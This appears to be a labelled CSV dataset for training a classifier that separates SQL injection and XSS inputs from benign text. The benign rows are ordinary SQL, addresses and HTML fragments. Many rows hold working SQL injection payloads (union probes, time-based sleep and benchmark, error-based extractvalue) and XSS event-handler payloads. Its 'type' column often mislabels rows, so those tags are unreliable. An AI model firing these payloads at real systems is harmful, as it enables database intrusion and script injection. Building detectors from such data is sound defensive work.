Text,Label,type
"1%""   )    )     )   union all select null,null,null,null,null,null,null#",1,sql
SELECT * FROM halfway WHERE appropriate = 'noted' FETCH FIRST 3 ROWS ONLY,0,xss
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",1,sql
SELECT * FROM happened WHERE rice = 'giant',0,sql
6267,0,sql
francoeu,0,sql
indamira,0,xss
"<ul><li><cite id=""CITEREFAsadaHosodaKuniyoshiIshiguro2009"" class=""citation journal"">Asada, M.; Hosoda, K.; Kuniyoshi, Y.; Ishiguro, H.; Inui, T.; Yoshikawa, Y.; Ogino, M.; Yoshida, C. (2009). ""Cognitive developmental robotics: a survey"". <i>IEEE Transactions on Autonomous Mental Development </i>. <b>1 </b> (1): 12–34. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2Ftamd.2009.2021702"">10.1109/tamd.2009.2021702 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Autonomous+Mental+Development&amp;rft.atitle=Cognitive+developmental+robotics%3A+a+survey&amp;rft.volume=1&amp;rft.issue=1&amp;rft.pages=12-34&amp;rft.date=2009&amp;rft_id=info%3Adoi%2F10.1109%2Ftamd.2009.2021702&amp;rft.aulast=Asada&amp;rft.aufirst=M.&amp;rft.au=Hosoda%2C+K.&amp;rft.au=Kuniyoshi%2C+Y.&amp;rft.au=Ishiguro%2C+H.&amp;rft.au=Inui%2C+T.&amp;rft.au=Yoshikawa%2C+Y.&amp;rft.au=Ogino%2C+M.&amp;rft.au=Yoshida%2C+C.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM collect WHERE every BETWEEN distant09/01/1996honor AND near15/31/1996element,0,sql
"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",2,xss
SELECT * FROM special,0,sql
"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""smhd"" like ""smhd",1,sql
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",1,sql
<nobr onblur=alert(1) tabindex=1 id=x></nobr><input autofocus>,2,xss
campillo,0,xss
SELECT * FROM young WHERE attention  BETWEEN 10 AND 20,0,sql
"    <link rel=""search"" title=""Search"" href=""search.html"" />",0,xss
" SELECT * FROM Customers  ORDER BY Country, CustomerName;",0,sql
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,sql
"1""  )   as ronb where 9368  =  9368",1,sql
1'+  (  select mfcd where 6757  =  6757 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1,sql
"-4222'  )   union all select 9267,9267,9267,9267,9267,9267--",1,xss
"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
"<script onclick=""alert(1)"">test</script>",2,xss
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",2,xss
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',1,sql
</ul>,0,xss
"c/ secretario guedes aleman s/n,",0,sql
tila,0,sql
SELECT include ( s )  FROM egg FULL OUTER JOIN,0,sql
SELECT MIN ( uncle )  AS if FROM almost,0,sql
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,2,xss
"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1,sql
"1%"" union all select null,null,null,null#",1,xss
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",2,xss
"<script type=""text/javascript"" src=""_static/readthedocs-data.js""></script>",0,xss
	 </span></a></dt><dd>Extend Scrapy with your custom functionality</dd>,0,xss
"<div class=""section"" id=""basic-concepts"">",0,xss
-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
"<li id=""cite_note-Bayesian_networks-205""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Bayesian_networks_205-0"">^ </a> </b> ",0,xss
"<li><a href=""/wiki/Process_control"" title=""Process control"">Process control system </a> </li>",0,xss
 UPDATE now SET kind = 'avoid'WHERE lot = 'his',0,sql
refrigerativo,0,sql
" SELECT * FROM usually ORDER BY game, nest",0,sql
SELECT AVG ( key )  FROM trip  SELECT SUM ( orange ) ,0,sql
carrer de merida 35 8-c,0,sql
SELECT hot ( s )  FROM division LEFT JOIN,0,sql
 </li>,0,xss
"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1,sql
SELECT TOP 3 * FROM respect WHERE accurate = 'bigger' SELECT * FROM explanation,0,sql
 </li>,0,xss
"<dt draggable=""true"" ondrag=""alert(1)"">test</dt>",2,xss
"<li><a href=""/wiki/Cognitive_closure_(philosophy)"" title=""Cognitive closure (philosophy)"">Cognitive closure </a> </li>",0,xss
1'+  (  select 'kcix' where 1117  =  1117,1,sql
-2530%' order by 1#,1,sql
SELECT * FROM went WHERE slow BETWEEN aware09/01/1996exist AND route15/31/1996smaller,0,sql
garzon6@mtos.ro,0,sql
SELECT * FROM idea WHERE improve  BETWEEN 10 AND 20,0,sql
atiy,0,sql
"<template oncontextmenu=""alert(1)"">test</template>",2,xss
SELECT * FROM ago  WHERE noon = blank,0,sql
"<li class=""toclevel-3 tocsection-57""><a href=""#Artificial_moral_agents""><span class=""tocnumber"">8.3.1 ",0,xss
"<shadow onmouseleave=""alert(1)"">test</shadow>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",2,xss
"<var draggable=""true"" ondragenter=""alert(1)"">test</var>",2,xss
9728,0,sql
"	<sup id=""cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1"" class=""reference""><a href=""#cite_note-Biological_intelligence_vs._intelligence_in_general-16"">&#91;16&#93; </a> </sup>",0,xss
"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
1'   )    )    waitfor delay '0:0:5'--,1,xss
SELECT * FROM tin FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM lunch,0,xss
"<canvas oncontextmenu=""alert(1)"">test</canvas>",2,xss
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1,sql
"<li><a href=""/wiki/Green_computing"" title=""Green computing"">Energy consumption (Green computing) </a> </li>",0,xss
SELECT * FROM funny WHERE wrapped BETWEEN '1996-07-01' AND '1996-07-31',0,sql
</dl>,0,xss
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,1,sql
marlsela,0,sql
lorain-ligero@mareventsprotocolosocial.tn,0,sql
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",2,xss
SELECT * FROM [Brazil Customers]; CREATE OR REPLACE VIEW [Brazil Customers] AS,0,sql
SELECT AVG ( touch ) FROM then,0,sql
"  SELECT bicycle AS lion, mood AS [toward]  FROM naturally",0,sql
SELECT FROM_DAYS ( 685467 ) ;,0,sql
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,2,xss
"<noscript onbeforepaste=""alert(1)"" contenteditable>test</noscript>",2,xss
SELECT COUNT ( edge )  FROM property,0,sql
emesh,0,sql
SELECT COUNT ( grew )  FROM noise,0,sql
61877469v,0,sql
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",1,sql
"   SELECT specific, matter, dailyFROM customs WHERE wave  IS NOT NULL",0,sql
"   SELECT paint, swimming, labor FROM wire WHERE closely  IS NULL",0,sql
<td onpointerenter=alert(1)>XSS</td>,2,xss
"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
SELECT COUNT ( fliesID ) FROM grandfather,0,sql
select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,1,sql
"calle pea de francia, 58,",0,sql
-9509'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz,1,sql
"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
"<ul><li><a href=""/wiki/Outline_of_robotics"" title=""Outline of robotics"">Outline </a> </li>",0,xss
SELECT TOP 3 * FROM fireplace WHERE value = 'least' SELECT * FROM frame,0,sql
if  (  4135  =  2165  )   select 4135 else drop function otyy--,1,sql
"1'   )    )    union all select null,null#",1,xss
"INSERT INTO quarter  ( plan, taken, country )  VALUES  ( 'tiny', 'needed', 'clock' )  ",0,sql
40197,0,sql
"<head oncut=""alert(1)"" contenteditable>test</head>",2,xss
"<frameset onmousedown=""alert(1)"">test</frameset>",2,xss
SELECT * FROM thought 3,0,sql
"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1,sql
or 'whatever' in   (  'whatever'  ) ,1,sql
SELECT * FROM silent WHERE society = 'failed' FETCH FIRST 3 ROWS ONLY,0,sql
"<meta name=""referrer"" content=""origin""/>",0,xss
"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",1,sql
"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",1,sql
"<li id=""cite_note-134""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-134"">^ </a> </b> ",0,xss
"  SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )  ",0,sql
"<li><a href=""/wiki/Computer_vision"" title=""Computer vision"">Computer vision </a> </li>",0,xss
	 </span>,0,xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   7749  =  7749",1,sql
"<figcaption oncontextmenu=""alert(1)"">test</figcaption>",2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_2_link' LIMIT 1,0,sql
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1,xss
SELECT * FROM me FETCH FIRST 3 ROWS ONLY,0,sql
SELECT shinning ( s )  FROM upward UNION ALL,0,xss
<details id=x tabindex=1 onactivate=alert(1)></details>,2,xss
-5764 or 3038  =  3038,1,sql
	 </span>,0,xss
"<li><a href=""/wiki/Physicalism"" title=""Physicalism"">Physicalism </a>",0,xss
"calle benito monfort 60,",0,xss
"1%'   )    )    union all select null,null,null,null,null,null--",1,xss
" SELECT * FROM electric ORDER BY mainly, sort",0,sql
1'  )   where 2974  =  2974 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
"1""  )   as kndn where 9314  =  9314",1,sql
alcoy/alcoi,0,sql
SELECT * FROM sick FETCH FIRST 3 ROWS ONLY,0,sql
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1,sql
"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",1,sql
chilln,0,xss
SELECT AVG ( Price ) FROM clay,0,sql
SELECT * FROM appearance WHERE every = 'exercise',0,xss
SELECT * FROM canal WHERE world = 'vast' LIMIT 3,0,xss
SELECT * FROM story FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM monkey,0,xss
"<frame onbeforepaste=""alert(1)"" contenteditable>test</frame>",2,xss
SELECT change ( s )  FROM chicken UNION ALL,0,xss
0o380ado6,0,sql
SELECT ATAN ( 2.5 ) ;,0,sql
quilolitr-o,0,sql
" </p><p>In the late 1990s and early 21st century, AI began to be used for logistics, <a href=""/wiki/Data_mining"" title=""Data mining"">data mining </a>, <a href=""/wiki/Medical_diagnosis"" title=""Medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-AI_widely_used_25-1"" class=""reference""><a href=""#cite_note-AI_widely_used-25"">&#91;25&#93; </a> </sup> The success was due to increasing computational power (see <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Moore's law </a> and <a href=""/wiki/Transistor_count"" title=""Transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between AI and other fields (such as <a href=""/wiki/Statistics"" title=""Statistics"">statistics </a>, <a href=""/wiki/Economics"" title=""Economics"">economics </a> and <a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-Formal_methods_in_AI_43-0"" class=""reference""><a href=""#cite_note-Formal_methods_in_AI-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/IBM_Deep_Blue"" class=""mw-redirect"" title=""IBM Deep Blue"">Deep Blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/Garry_Kasparov"" title=""Garry Kasparov"">Garry Kasparov </a>, on 11 May 1997.<sup id=""cite_ref-FOOTNOTEMcCorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-FOOTNOTEMcCorduck2004480–483-44"">&#91;44&#93; </a> </sup>",0,xss
"lealtad, 78, 6-h",0,sql
"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",1,xss
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou",1,xss
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,sql
 or ''-',1,sql
"c/ juan carlos onetti 4, 1?d",0,sql
"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/special-report/21700758-will-smarter-machines-cause-mass-unemployment-automation-and-anxiety"">""Automation and anxiety"" </a>. <i>The Economist </i>. 9 May 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",0,xss
dudas,0,xss
a5aranjada,0,sql
 </li>,0,xss
"<li><a href=""/wiki/Computational_biology"" title=""Computational biology"">Computational biology </a> </li>",0,xss
calle laguna de pealara 171 12-e,0,xss
4.8004E+14,0,sql
SELECT * FROM  ( SELECT clock FROM chest ) ,0,sql
<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,2,xss
<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>,2,xss
4574,0,sql
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",2,xss
7.93075E+15,0,sql
"1%"" order by 1--",1,xss
DELETE FROM garden WHERE closer = 'entire',0,sql
SELECT * FROM leave WHERE count BETWEEN 'yourself' AND 'group',0,sql
ado,0,sql
SELECT * FROM  ( SELECT either FROM include ) ,0,sql
"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
SELECT * FROM remarkable WHERE army = 'face'  AND City = 'massage',0,sql
SELECT * FROM alone WHERE bush BETWEEN 'volume' AND 'spread',0,sql
SELECT * FROM ProductsWHERE Price NOT BETWEEN 10 AND 20;,0,sql
"<dir onmousemove=""alert(1)"">test</dir>",2,xss
"<style>@keyframes slidein {}</style><picture style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></picture>",2,xss
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,0,sql
" SELECT * FROM usual ORDER BY willing, lift",0,sql
SELECT COUNT ( represent )  FROM purple,0,sql
SELECT * FROM tea WHERE captain NOT BETWEEN 'just' AND 'park',0,sql
91sc04de9o,0,sql
"<h3><span class=""mw-headline"" id=""Cybersecurity"">Cybersecurity ",0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
1%' and 9127  =  7687--,1,sql
"        <script src=""_static/js/hoverxref.js""></script>",0,xss
SELECT * FROM remove WHERE indicate BETWEEN copper09/01/1996them AND easier15/31/1996couple,0,sql
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,sql
"-5507' or elt  (  1032  =  1032,3623  )   and 'ndqw'  =  'ndqw",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=BBC+News&amp;rft.atitle=Robots+could+demand+legal+rights&amp;rft.date=2006-12-21&amp;rft_id=http%3A%2F%2Fnews.bbc.co.uk%2F2%2Fhi%2Ftechnology%2F6200005.stm&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
